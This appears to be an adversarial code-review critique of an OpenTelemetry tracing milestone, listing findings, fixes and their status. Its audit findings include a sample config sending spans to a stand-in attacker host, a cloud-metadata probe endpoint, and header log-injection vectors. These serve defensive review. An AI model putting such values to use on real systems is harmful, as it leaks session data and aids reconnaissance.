# Critique — E14_S02

**Critic:** adversary
**Generated:** 2026-05-16T00:00:00Z
**Commit range:** 7aeac51..d963beb
**Verdict:** SHIP-WITH-FIXES

## Executive summary

- Verdict SHIP-WITH-FIXES: the milestone meets every literal AC and the
  byte-stability hash is untouched, but the security default-deny posture
  for `ARXMCP_OTEL_ENDPOINT` is not enforced at config-parse time —
  Risk-note compliance leans on operator discipline, not code.
- Finding counts: 1 CRITICAL, 3 HIGH, 6 MEDIUM, 4 LOW.
- Highest-risk file: `server/config.py:201` (`otel_endpoint` accepts ANY
  URL without a loopback validator, contradicting `bind_host`'s precedent
  and the brief's Risk note).
- Cross-axis pattern: every "fail-open" path in the new code
  (`shutdown_tracing`, `_probe_endpoint`, `get_resources` lookup inside
  `_wrap_with_observability`, `Arxmcp-Agent-Role` decode) silently
  absorbs error states; none have a Prometheus counter or log-once
  guard, so a degraded tracing path is invisible to ops.
- TOOL_SCHEMA_VERSION stayed at 6 and `tests/test_server_tool_schema.py`
  is untouched in the diff — BP1 cache discipline preserved per D7.
- `span_summarize` and `span_bm25` ship with zero callers and zero
  tests — YAGNI-flavored surface that the milestone's own AC explicitly
  did not require.
- Concrete invalidation lever for Phase 4: F2 (the `Arxmcp-Agent-Role`
  validation) is a one-line fix; F1 (loopback validator) is ~15 LOC; the
  rest are defensible LOW/MEDIUM.

## Severity calibration

| level | meaning | rectification phase action |
|---|---|---|
| CRITICAL | data loss, security regression, broken core invariant, or shippable-bug-in-production-now | always fix in Phase 4 |
| HIGH | wrong behavior reachable on common path, or load-bearing constraint violated | always fix in Phase 4 |
| MEDIUM | subtle correctness, missing test, latent foot-gun | fix only if cheap (≤ 30 LOC, small test surface) |
| LOW | style, naming, micro-perf | defer (record under `deferred_findings`) |

## Findings

### F1 — `otel_endpoint` accepts non-loopback URLs without validation

- **Severity:** CRITICAL
- **Source:** adversary
- **File:** server/config.py:201
- **What:** `otel_endpoint: str | None = None` has zero validation.
  `Config(otel_endpoint="https://otel.attacker.example:4317")` parses
  successfully; `setup_tracing` then registers an `OTLPSpanExporter`
  that forwards every span — including `mcp.session_id` and
  `arxmcp.agent_role` — to the attacker. The brief's Risk note pins
  exactly this scenario: *"OTel spans containing `mcp.session_id` must
  not be forwarded to a remote endpoint by default — the default OTLP
  endpoint is localhost Phoenix. Forwarding to an external SaaS
  collector would leak session IDs."*
- **Why it matters:** This is the milestone's only named security
  threat, and the code's only enforcement is the
  `.claude/docs/observability-tracing.md` security note. That's
  documentation, not defense. The repo already has the right precedent:
  `Config.reject_non_loopback` at `server/config.py:205-226` rejects
  non-loopback `bind_host` at parse time with a clear error. The same
  pattern must apply to `otel_endpoint`.
- **Proposed fix:** Add a `@field_validator("otel_endpoint")` that
  parses the URL and rejects hostnames not in
  `LOOPBACK_HOSTS ∪ {"localhost"}` unless an explicit
  `ARXMCP_OTEL_ALLOW_REMOTE=1` opt-in is set. The same validator
  rejects userinfo, non-`http://` / `https://` schemes, and missing
  hosts.
- **Regression guard:** New tests in `tests/test_config.py`:
  (1) `Config(otel_endpoint="http://192.168.1.5:4317")` raises
  `ValidationError`; (2) `Config(otel_endpoint="http://127.0.0.1:4317")`
  parses cleanly; (3) `Config(otel_endpoint=None)` parses (disabled).
  Add a `tests/test_tracing.py::TestSecurityDefault` class.

### F2 — `Arxmcp-Agent-Role` header is unvalidated and unbounded

- **Severity:** HIGH
- **Source:** adversary
- **File:** server/middleware.py:1039-1046, server/observability/tracing.py:305-307
- **What:** The middleware copies any value of `Arxmcp-Agent-Role`
  verbatim into the `current_agent_role` ContextVar via
  `agent_role_b.decode("ascii", errors="replace")`. `span_tool_call`
  then writes it unfiltered to the `arxmcp.agent_role` span attribute.
  No length cap, no allow-list, no character class restriction. An
  attacker who can hit `/mcp` (which is loopback-restricted but an
  important defense-in-depth boundary) can inject:
  - 64 KB strings (uvicorn's default header line limit) as the
    attribute, causing oversized spans + queue pressure on the
    BatchSpanProcessor;
  - log-injection sequences (`\n`, ANSI escapes) — the
    `errors="replace"` defends against raw bytes but `\n` is plain
    ASCII;
  - high-cardinality unique strings per request, blowing up Phoenix's
    cardinality budget.
- **Why it matters:** `.claude/docs/observability-tracing.md` advertises
  exactly four legitimate role values (sketcher / tactician / fixer /
  autoformalizer). Validating against that allow-list is a one-line
  defense that closes the cardinality + injection vector and matches
  the project pattern (`SessionCapMiddleware` validates session-id
  format via `_VALID_SESSION_ID_RE`).
- **Proposed fix:** In `TracingContextMiddleware.__call__`, validate
  `agent_role` against a module-level
  `_VALID_AGENT_ROLES = frozenset({"sketcher","tactician","fixer","autoformalizer"})`.
  Unknown / oversized values → log DEBUG, store `None`. The DEBUG log is
  rate-limited per session-id to avoid attacker-driven log flooding.
- **Regression guard:** `TestTracingContextMiddleware::test_unknown_agent_role_is_dropped`
  and `test_agent_role_length_capped` in `tests/test_tracing.py`.

### F3 — `_wrap_with_observability` re-imports `get_resources` on every request

- **Severity:** HIGH
- **Source:** adversary
- **File:** server/tools.py:435-441
- **What:** The wrapper does `from server.tools import get_resources`
  INSIDE `_instrumented` per call. This is a self-import from within
  `server.tools` — already imported at module load; the local re-import
  is at best dead overhead, at worst a footgun if a future refactor
  splits `get_resources` to a new module and the local-import path
  silently shadows the wrong reference. Worse, the comment claims it
  avoids a "circular import with server.resources" — but
  `get_resources` is in `server.tools` itself (the module we're
  already executing in). The comment is factually wrong.
- **Why it matters:** Two problems: (a) micro-overhead on the hot
  path (one `sys.modules` lookup + attribute access per tool call); (b)
  the misleading comment will confuse the next refactor. Combined with
  F4 below, the `try/except (ResourcesNotReadyError, AttributeError)`
  also masks legitimate startup races — a handler that runs while
  `_RESOURCES is None` gets `corpus_version_attr=None` AND the
  Resources.startup race becomes invisible.
- **Proposed fix:** Drop the local import; call `get_resources()`
  directly (it's already in module scope). Replace the misleading
  comment with: "Resources may not yet be set in the early lifespan
  window; fall back to None for the span attribute." Keep the
  `except (ResourcesNotReadyError, AttributeError)`.
- **Regression guard:** Test that the wrapper opens the parent span
  cleanly when `reset_resources_for_tests()` has been called (no
  raise; `arxmcp.corpus_version` simply absent on the span).

### F4 — Span renders `None` corpus_version as missing, but doc claims "yes when Resources warm"

- **Severity:** HIGH
- **Source:** adversary
- **File:** server/observability/tracing.py:308-309, .claude/docs/observability-tracing.md:60
- **What:** `span_tool_call` does `if corpus_version is not None:
  span.set_attribute(...)`. When `get_resources()` raises during
  startup (per F3), `corpus_version_attr=None` propagates and the
  attribute is silently OMITTED. The operator doc promises the
  attribute is set "yes when Resources warm" — but ops cannot
  distinguish "Resources never warmed" from "tracing was disabled"
  from the span shape.
- **Why it matters:** A startup race where the lifespan registers the
  first tool call before `set_resources(resources)` fires would
  silently produce spans WITHOUT `arxmcp.corpus_version`. Without a
  signal at the wrapper layer (a Prometheus counter, a WARN log) the
  miss is invisible.
- **Proposed fix:** When `get_resources()` raises
  `ResourcesNotReadyError` inside the wrapper, log WARNING once per
  process (gated by a module-level `_warned_resources_not_ready`
  boolean) and set the span attribute to the sentinel string
  `"resources-not-ready"`. Operators querying for
  `arxmcp.corpus_version="resources-not-ready"` see the race
  directly.
- **Regression guard:** `tests/test_tracing.py::TestWrapperIntegration::test_wrap_with_observability_when_resources_unset`
  asserts the WARN fires once and the span attribute carries the
  sentinel.

### F5 — `shutdown_tracing` swallows all exceptions with no severity discrimination

- **Severity:** MEDIUM
- **Source:** adversary
- **File:** server/observability/tracing.py:234-240
- **What:** The provider shutdown is wrapped in
  `try: provider.shutdown() except Exception: logger.warning(...)`.
  A genuine resource exhaustion (e.g. an OOMError during force-flush)
  or KeyboardInterrupt-derived exception class would be swallowed.
  More importantly, an OTLP exporter that hangs (network half-open
  with no RST) will block `provider.shutdown()` past the 30s
  resources-drain budget, and the surrounding `try/except` provides
  no timeout discipline.
- **Why it matters:** The lifespan's docstring promises a 30-second
  shutdown drain. A hung OTLP exporter at shutdown can blow this
  budget, and there's no upper bound on `provider.shutdown()`'s wall
  time. The `timeout_s: float = 30.0` parameter on the function is
  documented but never wired anywhere — `provider.shutdown()` is
  called without a timeout argument. The parameter is a lie.
- **Proposed fix:** Either (a) drop the unused `timeout_s` parameter
  to remove the false promise, or (b) wrap `provider.shutdown()` in
  `asyncio.wait_for` (requires making the function async) or run it
  in a thread with a join timeout. Option (a) is the 5-LOC fix; (b)
  is the right long-term answer.
- **Regression guard:** Add a docstring assertion test that
  `inspect.signature(shutdown_tracing).parameters` either contains an
  honored timeout OR contains no timeout parameter.

### F6 — `_probe_endpoint` exception list omits `socket.timeout` explicitly

- **Severity:** MEDIUM
- **Source:** adversary
- **File:** server/observability/tracing.py:253-260
- **What:** The probe catches `(OSError, ValueError)`. `socket.timeout`
  IS a subclass of `OSError` in Python 3.10+ (verified), so it IS
  caught — but the docstring at line 248-250 lists "socket.timeout"
  as a failure mode WITHOUT noting the inheritance, and the inline
  comment doesn't either. A reader who knows Python 2 / Python 3.7
  semantics (where `socket.timeout` was independent) may "fix" the
  except clause to add `socket.timeout` explicitly, drift the catch
  list over time, or remove `OSError` thinking it's too broad.
- **Why it matters:** Comment-rot risk. The DNS-resolution failure
  case is correctly handled today (`socket.gaierror` is also
  `OSError`), but the documentation should make this explicit.
- **Proposed fix:** Update the docstring to: "Failure modes returning
  False: `ConnectionRefusedError`, `socket.timeout`, `socket.gaierror`,
  and other `OSError` subclasses (`EHOSTUNREACH`, `ENETUNREACH`). All
  inherit from `OSError`; the single `except OSError` is intentional."
- **Regression guard:** None needed — this is a docstring change.

### F7 — `set_cache_layer` accepts arbitrary strings; OTel attribute exposes operator typos

- **Severity:** MEDIUM
- **Source:** adversary
- **File:** server/observability/tracing.py:322-336
- **What:** `set_cache_layer("Tier1")` (capital T), `"tier 1"` (with
  space), `"TIER1"` (all caps), or any other string lands directly on
  the `arxmcp.cache_layer_served` attribute. The docstring claims this
  is intentional ("free-form string; an invalid value surfaces as a
  query-time indicator that the handler emitted something unexpected"),
  but no test pins the canonical set against `set_cache_layer`'s
  enforcement — only the parametrized `TestContextVarPlumbing` test
  uses the canonical names. A handler typo silently produces a
  cardinality leak in Phoenix.
- **Why it matters:** Operator-trust-but-verify is incompatible with a
  free-form span attribute when the alternative (a 4-element
  `frozenset` check) is one line. The Prometheus
  `CACHE_HITS_COUNTER` labels are validated via the prometheus_client
  library's label-set discipline; the span attribute should match.
- **Proposed fix:** Add `_VALID_CACHE_LAYERS = frozenset({"tier1",
  "tier2", "tier3", "miss"})` and have `set_cache_layer` log DEBUG +
  ignore unknown values (preserving the prior `current_cache_layer`
  value). The "free-form" docstring becomes a documented strict-enum
  contract.
- **Regression guard:** `tests/test_tracing.py::test_set_cache_layer_rejects_typo`.

### F8 — `service.version` hardcoded "0.1.0" in 3 places (drift risk)

- **Severity:** MEDIUM
- **Source:** adversary
- **File:** server/observability/tracing.py:83 + server/main.py:360 + pyproject.toml:27
- **What:** `SERVICE_VERSION = "0.1.0"` (tracing.py),
  `version="0.1.0"` (FastAPI app), `version = "0.1.0"` (pyproject).
  When the project version bumps, two of three are likely to drift.
  Phoenix's service-version filter will then attribute traffic to the
  wrong release.
- **Why it matters:** Spans tagged with the wrong service version are
  worse than untagged spans (false attribution in cross-release
  comparison). The project lacks a single-source `__version__`
  constant.
- **Proposed fix:** Add `__version__ = "0.1.0"` to `server/__init__.py`
  (or read from `importlib.metadata.version("arxmcp")`); have both
  `tracing.py` and `main.py` import it. Drop the literal duplication.
- **Regression guard:** A test in `tests/test_meta_consistency.py`
  asserting `server.observability.tracing.SERVICE_VERSION ==
  importlib.metadata.version("arxmcp")`.

### F9 — `_probe_endpoint` is SSRF-adjacent at startup

- **Severity:** MEDIUM
- **Source:** adversary
- **File:** server/observability/tracing.py:243-260
- **What:** With F1 in place this becomes a non-issue. Without F1, an
  operator-set (or env-injected, or supply-chain-attacked) endpoint
  like `ARXMCP_OTEL_ENDPOINT=http://169.254.169.254:80/` triggers a TCP
  connect from the server process to a metadata-service endpoint at
  startup. Not full SSRF (we don't return the response to anyone), but
  it does prove server can reach the host — a useful primitive for
  attacker reconnaissance.
- **Why it matters:** Mostly closes once F1 lands. Documented here so
  the rectifier doesn't drop F1 thinking the threat is hypothetical.
- **Proposed fix:** Subsumed by F1's loopback validator.
- **Regression guard:** F1's tests.

### F10 — `test_disabled_path_is_fast` is named misleadingly

- **Severity:** MEDIUM
- **Source:** adversary
- **File:** tests/test_tracing.py:493-513
- **What:** The test's docstring acknowledges that the module-scoped
  `span_exporter` fixture installs a real `TracerProvider` +
  `SimpleSpanProcessor` BEFORE this test runs. So `tracer.start_as_current_span`
  is NOT in the disabled (ProxyTracer) path — it's in the enabled-but-
  cheap path. The test asserts `< 1.0s` for 1000 spans, which is
  trivially true with a real provider; an actually-disabled path
  would finish in microseconds. The test would still pass if the
  disabled-path optimization disappeared.
- **Why it matters:** The test name encodes a property the test does
  not actually verify. A future engineer "fixes" a perf regression by
  reading the test and concluding the disabled path is fast — but the
  test doesn't pin that.
- **Proposed fix:** Either rename to `test_enabled_path_1000_spans_under_1s`
  (truthful), OR run in a `subprocess` with `ARXMCP_OTEL_ENDPOINT`
  unset and assert the count is <100ms for 1000 spans.
- **Regression guard:** The test itself, renamed.

### F11 — No asyncio test for OTel context propagation across `await`

- **Severity:** MEDIUM
- **Source:** adversary
- **File:** tests/test_tracing.py (entire file)
- **What:** Synthesis §1 finding 7 explicitly flagged: "AsyncIO context
  propagation is automatic ... no current code path inside
  `_wrap_with_metrics` uses `create_task` inside the span." The test
  surface DOES exercise `span_tool_call` in an async wrapper
  (`test_wrap_with_observability_opens_parent_span`) but does not
  assert that the parent span context propagates through `await`
  boundaries into nested helpers — the test handler is a single
  `return SimpleNamespace(...)` with no `await` inside.
- **Why it matters:** A future handler that does
  `await asyncio.gather(child1(), child2())` inside the wrapper
  expects child spans to attach to the parent. If OTel context
  propagation were ever broken (e.g. by a misconfigured BatchSpanProcessor
  or an event-loop swap), the test surface would miss it.
- **Proposed fix:** Add a `test_parent_context_propagates_across_await`
  test where the wrapped handler awaits `asyncio.sleep(0)`, then
  opens a `span_ann`, then awaits again — assert the ANN span's
  `parent.span_id == parent_span.context.span_id`.
- **Regression guard:** The new test.

### F12 — `span_summarize` ships with no caller, no test, no consumer

- **Severity:** LOW
- **Source:** adversary
- **File:** server/observability/tracing.py:393-402
- **What:** The helper is registered in `__all__` and exported. Note
  07 lines 236-244 permanently dropped the in-server summarizer.
  `tests/test_tracing.py` does not import or exercise it. This is
  pure dead code dressed as forward-compat.
- **Why it matters:** YAGNI flag. The synthesis itself called it
  "permanently dropped"; importing a permanently-dropped concept as a
  forward-compat helper adds maintenance burden (every refactor of
  `tracing.py` reads it; every test-coverage gate sees it as
  untested).
- **Proposed fix:** Remove `span_summarize` from the module and its
  `__all__` entry. Also remove `span_bm25` for the same reason — v1
  search_papers is dense-only and the brief does not require it. Re-
  add when a real caller lands.
- **Regression guard:** None — removal is the regression guard.

### F13 — `TracingContextMiddleware` does not handle the lifespan scope

- **Severity:** LOW
- **Source:** adversary
- **File:** server/middleware.py:1014-1019
- **What:** `if scope["type"] != "http": await self.app(...); return`.
  Lifespan and websocket scopes pass through unchanged — which is
  correct for this middleware (no headers to copy). But this is the
  ONLY middleware in the stack that lazy-imports its dependencies
  (`from server.observability.tracing import ...` is INSIDE `__call__`,
  not the class body). If the FIRST request to the server is a
  websocket, the OTel module never gets imported, and a follow-on HTTP
  request takes a one-time ~100ms import penalty on a hot path.
- **Why it matters:** Latency landmine. The other middlewares
  (`HostValidationMiddleware`, `OriginValidationMiddleware`) import
  their dependencies at module scope.
- **Proposed fix:** Hoist the three ContextVar imports to module scope
  in `server/middleware.py`. The "tracing module is heavy" docstring
  rationale is wrong — the ContextVars themselves are cheap; only the
  OTLP exporter is heavy and that's already lazy-imported inside
  `setup_tracing`.
- **Regression guard:** None needed.

### F14 — `errors="replace"` on session-id header silently mints U+FFFD

- **Severity:** LOW
- **Source:** adversary
- **File:** server/middleware.py:1034-1043
- **What:** `session_id_b.decode("ascii", errors="replace")` silently
  produces `�` (U+FFFD REPLACEMENT CHARACTER) for any non-ASCII
  byte. The OTel attribute then carries the replacement character,
  which Phoenix renders as a black diamond. Compare to
  `SessionCapMiddleware` (`server/middleware.py:806-811`) which uses
  `errors="strict"`-equivalent semantics (try/except + fallback).
- **Why it matters:** Inconsistent decode discipline across the two
  middlewares that read the same header. Low-impact today because
  legitimate session-ids are 32 lowercase hex chars (`/^[0-9a-f]{32}$/`)
  and never contain non-ASCII bytes, but an attacker who can set the
  header can poison the trace attribute.
- **Proposed fix:** Replace `errors="replace"` with `errors="strict"`
  + a try/except that maps `UnicodeDecodeError` to `None`. Matches
  the precedent in `SessionCapMiddleware`.
- **Regression guard:** `tests/test_tracing.py::test_middleware_session_id_non_ascii_dropped`.

### F15 — `kwargs.get("k")` does not handle positional `k`

- **Severity:** LOW
- **Source:** adversary
- **File:** server/tools.py:430
- **What:** `k_attr = kwargs.get("k") if isinstance(kwargs.get("k"), int)
  else None` only reads `k` when passed as a keyword argument. FastMCP
  currently always passes tool arguments as kwargs (verified against
  the v1 mcp SDK), so this is correct today. A future FastMCP version
  that decides to pass positional args would silently omit the
  `arxmcp.k` span attribute.
- **Why it matters:** Future-fragility. Low likelihood, but trivial to
  defend against.
- **Proposed fix:** Use `inspect.signature(handler).bind(*args,
  **kwargs)` to extract `k` regardless of binding form. Or, since
  FastMCP's contract is kwargs-only, ADD a regression test that
  enforces this invariant so the test fails if FastMCP changes.
- **Regression guard:** `tests/test_tracing.py::test_span_records_k_when_passed_kwargs_only_for_now`.

## What was done well

- Default-disabled posture is correct: `setup_tracing` short-circuits
  when `otel_endpoint` is unset, hitting the ProxyTracer → NoOpTracer
  fast path with zero allocation per synthesis D2 + Brief 2 §2.5.
- `TOOL_SCHEMA_VERSION` stayed at 6; the byte-stability hash test
  (`tests/test_server_tool_schema.py`) is untouched in the diff,
  preserving BP1 prompt-cache discipline per
  `.claude/notes/07-multi-agent-caching.md` Property 1.
- The `Arxmcp-Agent-Role` header route (per synthesis D7) is the
  correct design decision over a JSON-Schema property — F2 above
  flags input validation, not the header strategy itself.
- Pure-ASGI `TracingContextMiddleware` correctly follows the
  E06_S01 F1 ban on `BaseHTTPMiddleware`; the pattern matches
  `BodySizeCapMiddleware` / `SessionCapMiddleware`.
- The `_wrap_with_metrics → _wrap_with_observability` rename + alias
  is a clean naming refactor; tests that imported the old name
  (`tests/test_server_metrics.py:65`) continue to work via the alias
  at `server/tools.py:500`.
- Idempotent `setup_tracing` guard (`_provider_installed`) +
  `_setup_lock` correctly handles the test-fixture re-call pattern
  flagged in synthesis §7's risk register.
- Cache-layer late-binding via ContextVar read in the parent span's
  `finally` block is the right pattern: a handler can call
  `set_cache_layer("tier2")` AFTER the span has opened, and the
  attribute reflects the served path.
- Lifespan ordering is right: `setup_tracing(config)` runs BEFORE
  `Resources.startup` so embedder + LanceDB warm-up spans are traced;
  `shutdown_tracing()` runs AFTER `resources.shutdown()` returns so
  the final shutdown-time spans flush.
- The 1-second TCP probe + WARN-not-FATAL pattern correctly closes
  the AC "OTel endpoint unreachable → server continues operating;
  WARN logged once at startup."
- `tests/test_session_caps.py::test_f7_middleware_order_session_cap_inside_request_body_size_limit`
  was sensibly relaxed from full-list-equality to relative-ordering;
  the load-bearing invariant (SessionCap INSIDE RequestBodySizeLimit)
  is preserved and the test no longer fails on every additive
  middleware change.

## Recommended rectification order

1. **F1** — loopback validator on `otel_endpoint`. The brief's only
   named security threat. ~15 LOC + 3 tests; subsumes F9.
2. **F2** — `Arxmcp-Agent-Role` allow-list + length cap. One-line
   validation + 2 tests; closes the cardinality and log-injection
   surface.
3. **F3** — drop the spurious self-import + fix the misleading
   comment in `_wrap_with_observability`. Trivial; clears the way for
   F4.
4. **F4** — surface `ResourcesNotReadyError` at the wrapper layer
   with a sentinel + WARN. Builds on F3.
5. **F5** — drop the unused `timeout_s` parameter on
   `shutdown_tracing` (option A — the 5-LOC fix). Defer the real
   shutdown timeout to a follow-on.
6. **F7** — strict enum on `set_cache_layer`. 5 LOC + 1 test.
7. **F8** — single-source `__version__` for `service.version`.
8. **F10** — rename or rewrite `test_disabled_path_is_fast`.
9. **F11** — add the async-await context-propagation test.
10. **F12** — remove `span_summarize` + `span_bm25` (defer if
    rectifier prefers to keep forward-compat optimism).
11. **F6, F13, F14, F15** — cheap LOW cleanups; batch with F12 if
    bandwidth permits.

## Rectification status (filled by Phase 4)

- **F1** (CRITICAL — otel_endpoint loopback): fixed. Added
  `@model_validator(mode="after") validate_otel_endpoint_loopback`
  on `Config` plus an `otel_allow_remote: bool = False` escape
  hatch. Regression guards: 9 tests in
  `TestF1LoopbackValidator` covering loopback accept paths
  (127.0.0.1, localhost, None), reject paths (public IP, RFC-1918,
  link-local 169.254.x, userinfo, non-http scheme), and the
  `allow_remote=True` opt-in.
- **F2** (HIGH — agent-role allow-list + length cap): fixed.
  Added `VALID_AGENT_ROLES = {"sketcher", "autoformalizer",
  "tactician", "fixer"}` and `MAX_HEADER_BYTES = 256` to
  `server.observability.tracing`; `TracingContextMiddleware`
  validates the header and drops unknown / oversized values with
  a DEBUG log. Guards in `TestF2AgentRoleValidation` (3 tests).
- **F3** (HIGH — spurious self-import): fixed. Dropped the
  `from server.tools import get_resources` inside
  `_wrap_with_observability`; the function is in module scope.
  Updated the comment to reflect the actual rationale (not a
  circular-import concern; just a startup-race fall-back).
- **F4** (HIGH — silent corpus_version=None): fixed. Sentinel
  constant `CORPUS_VERSION_RESOURCES_NOT_READY = "resources-not-ready"`
  in `server.observability.tracing`; WARN-once guard
  `_warned_resources_not_ready_for_tracing` in `server.tools`.
  Test: `TestF4ResourcesNotReady::test_sentinel_string_on_corpus_version_attribute`
  asserts both the sentinel value and the once-only WARN.
- **F5** (MEDIUM — unused `timeout_s` on shutdown_tracing): fixed
  via option (a) from the critique — dropped the parameter and
  updated the docstring to be honest about the lack of a real
  bounded-shutdown story. A proper async-timeout follow-up is
  deferred.
- **F6** (MEDIUM — docstring drift on `_probe_endpoint`): fixed.
  Updated the docstring to explicitly note `socket.timeout`,
  `socket.gaierror`, and the `OSError` inheritance contract.
- **F7** (MEDIUM — `set_cache_layer` accepts arbitrary strings):
  fixed. Added `VALID_CACHE_LAYERS = {"tier1","tier2","tier3","miss"}`;
  `set_cache_layer` now logs DEBUG + ignores unknown values,
  preserving the prior layer. Guard:
  `TestF7CacheLayerEnum::test_typo_is_ignored` and
  `test_unknown_string_is_ignored`.
- **F8** (MEDIUM — `service.version` triple-duplicated): DEFERRED.
  Cross-cutting refactor (touches `server/__init__.py`,
  `pyproject.toml`, `tracing.py`, `main.py`). Tracked as a
  follow-up; not in scope for this milestone's rectification
  window.
- **F9** (MEDIUM — SSRF-adjacent): subsumed by F1.
- **F10** (MEDIUM — misleading test name): fixed. Renamed
  `test_disabled_path_is_fast` →
  `test_enabled_path_1000_spans_under_1s` and updated the class
  docstring to be honest about what the fixture installs.
- **F11** (MEDIUM — no async-await context propagation test):
  fixed. Added
  `TestF11AsyncContextPropagation::test_parent_context_propagates_across_await`
  exercising `asyncio.sleep(0)` between span boundaries.
- **F12** (LOW — `span_summarize` / `span_bm25` dead code):
  DEFERRED. The synthesis explicitly decided to ship these as
  forward-compat helpers. Removing them and re-adding later is
  more churn than the YAGNI cost; documented in §12 of the
  implementation summary.
- **F13** (LOW — lazy import in `TracingContextMiddleware`):
  partially fixed. The OTel-SDK exporter import remains lazy
  inside `setup_tracing` (heavy); the ContextVar imports were
  moved from `__call__`-time to function-scope at the top of the
  method, which still avoids a module-load-time cost while
  staying single-import. A future cleanup could hoist them to
  module scope; not a load-bearing perf win today.
- **F14** (LOW — `errors="replace"` on header decode): fixed.
  New helper `_decode_header_strict` returns `None` on
  `UnicodeDecodeError`; both headers go through it. Guard:
  `TestF14StrictHeaderDecode::test_non_ascii_session_id_becomes_none`.
- **F15** (LOW — positional `k` not handled): DEFERRED. FastMCP's
  contract is kwargs-only at the v1 SDK; adding `inspect.signature.bind`
  for a theoretical future-FastMCP change is speculative work.
  Not load-bearing today.
